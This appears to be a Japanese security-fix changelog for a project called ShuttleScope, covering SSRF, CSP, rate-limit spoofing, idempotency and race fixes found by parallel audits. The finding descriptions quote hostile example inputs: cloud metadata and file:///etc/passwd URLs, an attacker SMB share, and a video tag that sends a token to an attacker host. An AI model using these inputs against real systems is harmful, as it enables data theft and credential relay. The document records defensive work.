# Round 258 R18 — 3 並列独立監査の結果適用

## 概要

R17 (4a90f3a) の commit 直後に **3 体の general-purpose subagent** に独立監査を依頼。
各エージェントは「Electron + frontend」「backend auth + WS」「pipeline + worker + cluster」
のいずれかにスコープを限定し、互いに参照せずに R7-R17 漏れを掘る。

合計 **3 P0 + 7 P1 + 13 P2/P3** が報告された。本 R18 では:

- 3 P0 すべて
- 4 P1 (CSP 強化 / CF-Connecting-IP / idempotency 上書き / sweep regex 厳格化)
- 1 P2 (retry timer leak)

を 1 commit にまとめて修正。残 P1/P2/P3 は backlog として R19 以降にキャリーオーバ。

## 修正一覧

### R18a-1 P0-1 — `useServerSideRecording.ts` uploadId race

| | |
| --- | --- |
| 影響 | `stop()` と `uploadChunk()` が競合し、`uploadIdRef.current` が `null` 化された後に await から戻った chunk POST が `null` 文字列を multipart に詰めたまま出ていく / または finalize 後の dead session に書き込み |
| ファイル | `shuttlescope/src/hooks/session/useServerSideRecording.ts` |

**修正方針**: `uploadChunk` 関数頭で `const uploadId = uploadIdRef.current` をスナップショットし、await 後に `uploadIdRef.current !== uploadId` なら結果を破棄。

### R18a-2 P0-1 — `_operator_owners` 無制限増殖 → memory DoS

| | |
| --- | --- |
| 影響 | 認証済 operator (admin/analyst/coach) が乱数の `session_code` で接続/切断を繰り返すと `_operator_owners[session_code]` が永続蓄積、process RAM を食い潰す |
| ファイル | `shuttlescope/backend/ws/camera.py` |

**修正方針**: `dict` を `OrderedDict` に置換し `_OPERATOR_OWNERS_MAX = 4096` で LRU 制限。新規挿入と既存 `owner is not None` 経路の両方で `move_to_end` を呼んで active な session を末尾保持。`popitem(last=False)` で古い順に evict。

### R18a-3 P0-1 — pipeline `cv2.VideoCapture` 経由の SSRF / 任意ファイル読み

| | |
| --- | --- |
| 影響 | analyst が `Match.video_local_path` に `http://169.254.169.254/...` (AWS IMDS), `rtsp://attacker/`, `\\\\attacker\\share\\evil.mkv`, `file:///etc/passwd` 等を仕込むと、worker / cluster pipeline が **そのまま OpenCV / TrackNet / MediaPipe に渡し**、worker 特権で SSRF / 任意ファイル読み / SMB credential relay |
| ファイル | `shuttlescope/backend/utils/path_jail.py` (`assert_pipeline_video_source_safe` 新規追加) / `shuttlescope/backend/pipeline/video_pipeline.py` / `shuttlescope/backend/cluster/pipeline.py` |

**修正方針**: `path_jail.py` に `assert_pipeline_video_source_safe()` を新設。`localfile:///` / `server://` だけ通し、それ以外で `://` を含むスキーム / UNC `\\\\host\\share` / `file:` プレフィックスはすべて `ValueError` で reject。`run_pipeline()` 入口と `run_video_analysis_pipeline()` 入口で呼び出す。

### R18a-1 P1-1/P1-2 — CSP `data:` / `https:` ワイルドカード撤去

| | |
| --- | --- |
| 影響 | renderer XSS が `<video src="https://attacker/exfil?token=...">` で path-info を任意 https ホストに送る covert exfil。`data:` を `default-src` に許していたため CSP の防御深度が弱かった |
| ファイル | `shuttlescope/electron/main.ts` (`cspParts`) |

**修正方針**:
- `default-src` から `data:` 撤去
- `media-src` を `'self' localfile: app: blob:` のみに縮小 (https: 撤去、data: 撤去)
- `img-src` の `https:` ワイルドカードを `_PROD_HTTPS_HOST_LIST` (4 host) に絞り込み

### R18a-2 P1-1 — `CF-Connecting-IP` loopback gate

| | |
| --- | --- |
| 影響 | LAN 直接到達経路 (port 8765 / cluster / Tailscale) からの request が `CF-Connecting-IP` ヘッダを偽装し、ログイン IP レート制限 (10/60s) を回避してパスワード総当たり |
| ファイル | `shuttlescope/backend/routers/auth.py` (`_get_ip`) |

**修正方針**: `is_loopback_request(request)` で socket peer が loopback (= cloudflared sidecar) のときだけ `CF-Connecting-IP` を採用。それ以外は socket IP を返す。

### R18a-2 P1-2 — Idempotency cross-user 上書き

| | |
| --- | --- |
| 影響 | ユーザ A が key X を発行 → ユーザ B が同 key X で別 endpoint を叩く → `get_cached` は (user_id, endpoint) ミスマッチで `None` を返し B は通常実行 → `_db_store` が **既存 A レコードを盲目的に上書き** → A の再 POST が replay されず再実行 (二重課金 / 二重副作用) |
| ファイル | `shuttlescope/backend/utils/idempotency.py` (`_db_store`) |

**修正方針**: `existing.result_json` から `(user_id, endpoint)` を読み出し、リクエスト主と一致しない場合は warn ログを残して書き込みを抑止。元レコードの replay 情報を守り、衝突した別ユーザは "replay 不能" な代償として通常実行のみが進む。

### R18a-1 P1-3 — sweeper regex 厳格化

| | |
| --- | --- |
| 影響 | R17 の `[A-Za-z0-9_-]{1,128}$` は依然として `__ss_pending_upload_user_settings` を誤 sweep。コメント intent と実装が不一致 |
| ファイル | `shuttlescope/src/hooks/session/useServerSideRecording.ts` |

**修正方針**: 旧フォーマットの正確構造 `__ss_pending_upload_<digits>` / `__ss_pending_upload_<uuid-hex>_<digits>` だけ許容する正規表現に置換。

### R18a-1 P2-4 — recorder.start throw 後の retry timer leak

| | |
| --- | --- |
| 影響 | `recorder.start()` が throw した場合、その前に setInterval した retry timer が orphan して dead upload session に再送し続ける |
| ファイル | `shuttlescope/src/hooks/session/useServerSideRecording.ts` |

**修正方針**: `setInterval(flushPending, ...)` を `recorder.start()` の **成功後** に移動。throw 経路では timer が起動しない。
